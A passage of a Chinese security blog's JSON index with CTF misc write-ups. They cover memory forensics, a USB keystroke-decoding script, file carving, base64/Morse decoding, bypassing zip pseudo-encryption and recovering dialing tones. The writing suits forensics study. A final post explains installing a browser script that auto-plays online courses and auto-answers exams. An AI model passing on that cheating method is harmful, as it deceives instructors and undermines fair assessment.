./将文件导出至当前目录。导出文件为二进制格式。接下来继续binwalk分析。可以得到一个压缩包，压缩包里包含了加密的usb.txt文件。下一步就是获取加密的密码。在尝试爆破的同时，继续进行内存取证分析。通过volatility工具的子命令 hivelist 可以获得内存中的注册表信息，cmdscan查看cmd操作，connscan查看网络连接，pslist查看进程。通过cmscan我们可以发现提示了密码：尝试将该密码作为文件的解压密码（使用360解压，可以自动修复文件）—-成功！现在获得了敲击码，接下来就是将敲击码转换为字符。使用脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import sysimport os usb_codes = &#123; 0x04:&quot;aA&quot;, 0x05:&quot;bB&quot;, 0x06:&quot;cC&quot;, 0x07:&quot;dD&quot;, 0x08:&quot;eE&quot;, 0x09:&quot;fF&quot;, 0x0A:&quot;gG&quot;, 0x0B:&quot;hH&quot;, 0x0C:&quot;iI&quot;, 0x0D:&quot;jJ&quot;, 0x0E:&quot;kK&quot;, 0x0F:&quot;lL&quot;, 0x10:&quot;mM&quot;, 0x11:&quot;nN&quot;, 0x12:&quot;oO&quot;, 0x13:&quot;pP&quot;, 0x14:&quot;qQ&quot;, 0x15:&quot;rR&quot;, 0x16:&quot;sS&quot;, 0x17:&quot;tT&quot;, 0x18:&quot;uU&quot;, 0x19:&quot;vV&quot;, 0x1A:&quot;wW&quot;, 0x1B:&quot;xX&quot;, 0x1C:&quot;yY&quot;, 0x1D:&quot;zZ&quot;, 0x1E:&quot;1!&quot;, 0x1F:&quot;2@&quot;, 0x20:&quot;3#&quot;, 0x21:&quot;4$&quot;, 0x22:&quot;5%&quot;, 0x23:&quot;6^&quot;, 0x24:&quot;7&amp;&quot;, 0x25:&quot;8*&quot;, 0x26:&quot;9(&quot;, 0x27:&quot;0)&quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-_&quot;, 0x2E:&quot;=+&quot;, 0x2F:&quot;[&#123;&quot;, 0x30:&quot;]&#125;&quot;, 0x32:&quot;#~&quot;, 0x33:&quot;;:&quot;, 0x34:&quot;&#x27;\\&quot;&quot;, 0x36:&quot;,&lt;&quot;, 0x37:&quot;.&gt;&quot;, 0x4f:&quot;&gt;&quot;, 0x50:&quot;&lt;&quot; &#125; def code2chr(filepath): lines = [] pos = 0 for x in open(filepath,&quot;r&quot;).readlines(): code = int(x[6:8],16) # 即第三个字节 if code == 0: continue # newline or down arrow - move down if code == 0x51 or code == 0x28: pos += 1 continue # up arrow - move up if code == 0x52: pos -= 1 continue # select the character based on the Shift key while len(lines) &lt;= pos: lines.append(&quot;&quot;) if code in range(4,81): if int(x[0:2],16) == 2: lines[pos] += usb_codes[code][1] else: lines[pos] += usb_codes[code][0] for x in lines: print(x) if __name__ == &quot;__main__&quot;: # check argv if len(sys.argv) != 2: print(&quot;Usage:\\n\\tpython keyboardScanCode.py datafile.txt\\nhow to get datafile:\\t tshark -r file.usb.pcapng -T fields -e usb.capdata &gt; datafile.txt&quot;) exit(1) else: filepath = sys.argv[1] code2chr(filepath) 读取usbdata.txt即可获取flag.注意将括号[]转为{} 题目总结","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"简单misc","slug":"简单misc","date":"2020-03-09T12:26:32.000Z","updated":"2020-03-09T14:18:49.000Z","comments":true,"path":"2020/03/09/简单misc/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E7%AE%80%E5%8D%95misc/","excerpt":"","text":"预备知识 :kali linux、binwalk使用、文件头文件尾、base64、摩斯密码附件分析：我们拿到一个压缩包，包括了一张图片和一个压缩包。子压缩包中有flag，但是被加密了。 图片处理将图片解压后，我们可以看到图片是裂的，不能看。所以考虑将图片修复。常见文件头尾使用winhex打开后，发现文件头尾正确。但是文件尾部并不是以FF D9结尾。所以我们考虑可能有额外的文件包含在了这张图片中。 文件分离使用binwalk 工具，可以分析文件结构，将复合文件提取出来。使用方法：binwalk -e filename eg:binwalk -e photo.jpg分析完后可以发现文本ctf.txt 打开后发现是摩斯密码，使用工具将其解密后为EPIDEMICSITUATIONOFUNIVERSITYWAR由于不是常见的密码形式，于是尝试base64解码。解码后得到EPIDEMICSITUATIONOFUNIVERSITYWAR然后解压附件中的加密文件。解压后，附件flag.txt中的文件内容为VGgxc19pc19GbGFHX3lvdV9hUkVfcmlnSFQ=看到**=**，考虑base64编码。进行解码。base64解码工具解码后的内容为Th1s_is_FlaG_you_aRE_rigHT即可获得正确flag。 题目总结这道题相对比较简单 虽然师傅们秒了，我还是花了几分钟才做出来。也可能是运气成分，加上这题比较简单，所以思路比较清晰。这题的关键是文件分离与看得懂编码。base系列编码介绍","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"隐藏的信息","slug":"隐藏的信息","date":"2020-03-09T11:31:54.000Z","updated":"2020-03-09T14:17:43.000Z","comments":true,"path":"2020/03/09/隐藏的信息/","link":"","permalink":"https://polosec.github.io/2020/03/09/%E9%9A%90%E8%97%8F%E7%9A%84%E4%BF%A1%E6%81%AF/","excerpt":"","text":"预备知识：伪加密链接、十六进制文件读取、音频处理、二维码复原附件分析1.拿到这道题的文件后，首先看到一张二维码，还有一个有解压密码的压缩包。2.首先对这张二维码进行分析。放入WINHEX(16进制分析工具)后可以发现，在文件的最后隐约有提示”use base64 to get your flag”。暂时不知道什么用，记下来。3.由于二维码是残缺的，通过PS对二维码的三个定位点复原后可以获得原二维码，然而没有有用的信息。这里不作详细解释。4.接下来我们着手分析这个加密的压缩包。 加密压缩包处理由于压缩包是加密的，首先考虑暴力破解、CRC32碰撞等方式破解密码—-无效。接下来考虑到压缩包可能是伪加密(关于伪加密的详细概念见预备知识中的链接)简单来说就是实际上压缩包是没有加密的，只是出现了表面上加密，让你输入解压密码。破解伪加密的方法：使用winhex软件打开压缩包，将504B0304后的第3、4个字节改为00 00，将504B0102后的第5、6个字节改为00 00即可破解伪加密。 之后再解压文件就不会提示输入解压密码了。 音频文件分析使用音频分析软件Audacity打开wav文件进行分析。点击软件左方倒三角，模式切换到波形(db)即可发现音频文件的前后都有听不到、但是有分贝的部分。然后把中间的能听到的部分切掉，将剩下的听不到的部分导出，然后打开AU。打开AU后导入文件，看到音轨是平的，于是我们增加分贝。统一增加分贝后，由于前面一段的声音太小，于是对前面一段单独增加分贝。这样就可以听清了。然后打开手机拨号键盘，根据拨号音以及之间的细微差别，可以听出播的号码为187485618521。根据开头图片给的提示，通过base64加密后，即可获得flag. 题目总结这道题整体来说不难。但是在音频处理的时候很多人想不到拨号音以及放大。在听拨号音的时候其实可以用一些工具，但是对音频分贝的处理以及噪声可能会导致工具识别错误。所以采用用耳朵听的方式。在听的时候先听前五个，自己去拨号模拟一下。前五个比较好确定。然后听最后三个 只有4种特定的键位才能形成最后三个的音调。然后两两确定中间的67 89，多次尝试后即可获得正确的结果。","categories":[{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"}],"tags":[{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"}]},{"title":"如何科学地看网课(知到)","slug":"科学看网课","date":"2020-03-06T10:08:41.000Z","updated":"2020-03-13T09:26:06.000Z","comments":true,"path":"2020/03/06/科学看网课/","link":"","permalink":"https://polosec.github.io/2020/03/06/%E7%A7%91%E5%AD%A6%E7%9C%8B%E7%BD%91%E8%AF%BE/","excerpt":"","text":"使用谷歌浏览器安装油猴插件从 油猴下载链接 获取油猴脚本的插件(需要科学上网)。下载后根据提示，将油猴插件添加至chrome扩展。添加过后就可以在地址栏右侧看到这个图标：代表安装成功。无需科学上网的方法：从墙内链接获取油猴脚本.CRX文件，然后在浏览器地址栏输入chrome://extensions 添加.crx文件。详细添加教程转自Chrome安装CRX插件方法 获取看网课脚本随后单击该图标，选择获取新脚本。点击第二个”GreasyFork”。进入后搜索”智慧树网课助手”单击进入后，选择安装。安装后是这样：随后打开网课系统，登陆后点开需要看的网课可自动1.5倍速静音播放。 自动考试该脚本最好的功能(个人认为)是自动考试功能。使用方法：选择章节作业/考试，点进去后脚本会自动搜索题目答案并且自动选择，等所有答案检索完毕后提交即可。 吐槽智慧树平台个人感觉一般。1.登陆时界面不够人性化，而且选择学号登陆时，选择学校，输入完学号密码后按回车登录会跳转到手机号登录。再次选择学号登录才能正常登录。2.成绩分析界面 看课习惯时间轴逆序。做这个图的程序员起夜级李姐 :)。","categories":[],"tags":[{"name":"杂项","slug":"杂项","permalink":"https://polosec.github.io/tags/%E6%9D%82%E9%A1%B9/"}]}],"categories":[{"name":"git","slug":"git","permalink":"https://polosec.github.io/categories/git/"},{"name":"wp","slug":"wp","permalink":"https://polosec.github.io/categories/wp/"},{"name":"web基础","slug":"web基础","permalink":"https://polosec.github.io/categories/web%E5%9F%BA%E7%A1%80/"}],"tags":[{"name":"rdg","slug":"rdg","permalink":"https://polosec.github.io/tags/rdg/"},{"name":"awd","slug":"awd","permalink":"https://polosec.github.io/tags/awd/"},{"name":"免杀","slug":"免杀","permalink":"https://polosec.github.io/tags/%E5%85%8D%E6%9D%80/"},{"name":"红队技能","slug":"红队技能","permalink":"https://polosec.github.io/tags/%E7%BA%A2%E9%98%9F%E6%8A%80%E8%83%BD/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://polosec.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"取证","slug":"取证","permalink":"https://polosec.github.io/tags/%E5%8F%96%E8%AF%81/"},{"name":"反序列化","slug":"反序列化","permalink":"https://polosec.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"},{"name":"ctf","slug":"ctf","permalink":"https://polosec.github.io/tags/ctf/"},{"name":"buuoj","slug":"buuoj","permalink":"https://polosec.github.io/tags/buuoj/"},{"name":"流量分析","slug":"流量分析","permalink":"https://polosec.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"},{"name":"misc","slug":"misc","permalink":"https://polosec.github.io/tags/misc/"},{"name":"网络","slug":"网络","permalink":"https://polosec.github.io/tags/%E7%BD%91%E7%BB%9C/"},{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"},{"name":"c++","slug":"c","permalink":"https://polosec.github.io/tags/c/"},{"name":"buu","slug":"buu","permalink":"https://polosec.github.io/tags/buu/"},{"name":"密码学","slug":"密码学","permalink":"https://polosec.github.io/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"c语言","slug":"c语言","permalink":"https://polosec.github.io/tags/c%E8%AF%AD%E8%A8%80/"},{"name":"linux","slug":"linux","permalink":"https://polosec.github.io/tags/linux/"},{"name":"git","slug":"git","permalink":"https://polosec.github.io/tags/git/"},{"name":"0307xctf","slug":"0307xctf","permalink":"https://polosec.github.io/tags/0307xctf/"},{"name":"杂项","slug":"杂项","permalink":"https://polosec.github.io/tags/%E6%9D%82%E9%A1%B9/"}]}